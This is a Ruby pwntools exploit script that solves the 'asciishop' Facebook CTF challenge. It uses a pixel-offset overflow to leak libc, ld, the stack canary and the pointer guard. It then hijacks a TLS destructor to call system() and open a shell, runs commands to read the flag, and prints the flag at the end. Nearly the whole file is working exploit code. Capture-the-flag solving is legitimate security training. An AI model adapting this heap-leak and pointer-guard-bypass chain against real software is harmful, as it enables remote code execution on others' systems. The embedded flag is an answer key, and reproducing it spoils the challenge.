#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo

host, port = 'challenges.fbctf.com', 1340
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'asciishop'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt; z.gets '>>> '; end

def image(data, width: 32, height: 32, offset: 0)
  'ASCI' + p32(height) + p32(width) + p32(offset) + data.ljust(1024, "\x00")
end

def upload(ascii_id, data)
  # pt
  z.puts 1
  # z.gets 'id:'
  z.puts ascii_id
  # z.gets 'ascii'
  z.write data.ljust(1040, "\x00")
end

def delete(ascii_id)
  pt
  z.puts 3
  z.gets 'id: '
  z.puts ascii_id
end

def change_pixel(id, x, y, chr)
  fail if " \n\t\r".include?(chr)
  pt; z.puts 4
  pt; z.puts 1
  z.puts id
  pt; z.puts 1
  z.gets '(X, Y)'
  z.puts "(#{x}, #{y}) #{chr}"
  pt; z.puts 4 # back
  pt; z.puts 4 # back
end

def show(id)
  pt; z.puts 2
  z.puts id
end

if @local
  (9 * 16).times do
    upload('dummy', image('a' * 1024, width: 32, height: 32, offset: 0x0))
  end
end

(3 * 16).times do |i|
  upload('BBB' + i.to_s, image('b' * 1024))
end

upload('hack', image('c' * 1024, width: 32, height: 1, offset: 0x80000000))
# STDIN.gets
# height(1) * y + x + offset(0x80000000) = -0x41c + 105
change_pixel('hack', 0x40000000-0x41c + 105, 0x40000000, "\x03") # width of BBB3 becomes 0x320
show('BBB3')
z.gets 'BBB15'
z.gets "\x00" * 0xe70
z.gets "\x00" * 0xaa2
data = z.readn(0x200).unpack("Q*")
z.gets '<<<EOF'
# data.each_with_index do |v,i|
#   log.info i
#   h.offset(v)
# end

libc = ELF.new('../libc-2.27.so')
libc.address = data[21]
log.dump libc.address.hex
fs = data[22]
ld = data[22] - 0x1f5180
dtor_at = fs-0x78
log.dump ld.hex
log.dump (ld-libc.address).hex
canary = data[27] # stack guard
@ptr_g = data[28] # pointer guard
log.dump canary.hex
log.dump @ptr_g.hex

@b3_data = fs - 0x5510
def write8(at, value)
  value.p64.bytes.each_with_index do |b, i|
    change_pixel('BBB3', at + i - @b3_data, 0, b.chr)
  end
end

def rol(v, b)
  ((v << b) | (v >> (64-b))) & (2**64 - 1)
end

def enc(addr)
  rol(addr ^ @ptr_g, 17)
end

upload('dtor', image(flat(
  enc(libc.symbols['system']),
  libc.address + 0x1b3e9a
)))

write8(dtor_at, fs - 0x14d48)
z.puts 5
sleep(0.2)
z.puts 'ls -la; id; cat /home/`whoami`/flag'
z.interact

# fb{s4fe_4nd_50und_fr0m_5ma5hing}
